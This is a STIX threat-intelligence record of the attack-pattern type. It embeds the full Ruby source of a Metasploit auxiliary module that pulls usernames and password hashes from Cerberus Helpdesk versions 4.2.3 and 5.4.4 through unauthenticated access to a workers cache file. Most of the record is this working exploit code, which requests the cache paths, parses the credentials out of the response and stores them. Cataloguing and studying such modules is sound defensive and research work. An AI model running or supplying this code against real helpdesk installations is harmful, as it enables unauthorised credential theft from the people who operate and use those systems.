{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--71afe010-97f2-4d36-8812-3535f9ff356f",
    "created": "2024-08-14T16:31:40.833693Z",
    "modified": "2024-08-14T16:31:40.833697Z",
    "name": "Cerberus Helpdesk User Hash Disclosure",
    "description": " This module extracts usernames and password hashes from the Cerberus Helpdesk through an unauthenticated access to a workers file. Verified on Version 4.2.3 Stable (Build 925) and 5.4.4  'References'   => [ [ 'EDB', '39526' ] ]",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/cerberus_helpdesk_hash_disclosure.rb",
            "external_id": "cerberus_helpdesk_hash_disclosure.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'         => 'Cerberus Helpdesk User Hash Disclosure',\n      'Description'  => %q{\n        This module extracts usernames and password hashes from the Cerberus Helpdesk\n        through an unauthenticated access to a workers file.\n        Verified on Version 4.2.3 Stable (Build 925) and 5.4.4\n        },\n      'References'   =>\n        [\n          [ 'EDB', '39526' ]\n        ],\n      'Author'       =>\n        [\n          'asdizzle_', # discovery\n          'h00die',    # module\n        ],\n      'License'      => MSF_LICENSE,\n      'DisclosureDate' => 'Mar 7 2016'\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [false, 'URL of the Cerberus Helpdesk root', '/'])\n      ])\n  end\n\n  def run_host(rhost)\n    begin\n      ['devblocks', 'zend'].each do |site|\n        url = normalize_uri(datastore['TARGETURI'], 'storage', 'tmp', \"#{site}_cache---ch_workers\")\n        vprint_status(\"Attempting to load data from #{url}\")\n        res = send_request_cgi({'uri' => url})\n        if !res\n          print_error(\"#{peer} Unable to connect to #{url}\")\n          next\n        end\n\n        if !res.body.include?('pass')\n          print_error(\"Invalid response received for #{peer} for #{url}\")\n          next\n        end\n\n        cred_table = Rex::Text::Table.new 'Header'  => 'Cerberus Helpdesk User Credentials',\n                                          'Indent'  => 1,\n                                          'Columns' => ['Username', 'Password Hash']\n\n        # the returned object looks json-ish, but it isn't. Unsure of format, so we'll do some ugly manual parsing.\n        # this will be a rough equivalent to sed -e 's/s:5/\\n/g' | grep email | cut -d '\"' -f4,8 | sed 's/\"/:/g'\n        result = res.body.split('s:5')\n        result.each do |cred|\n          if cred.include?('email')\n            cred = cred.split(':')\n            username = cred[3].tr('\";', '') # remove extra characters\n            username = username[0...-1] # also remove trailing s\n            password_hash = cred[7].tr('\";', '') # remove extra characters\n            print_good(\"Found: #{username}:#{password_hash}\")\n            store_valid_credential(\n              user:         username,\n              private:      password_hash,\n              private_type: :nonreplayable_hash\n            )\n            cred_table << [username, password_hash]\n          end\n        end\n        print_line\n        print_line cred_table.to_s\n        break\n      end\n\n    rescue ::Rex::ConnectionError\n      print_error(\"#{peer} Unable to connect to site\")\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "Mar 7 2016"
}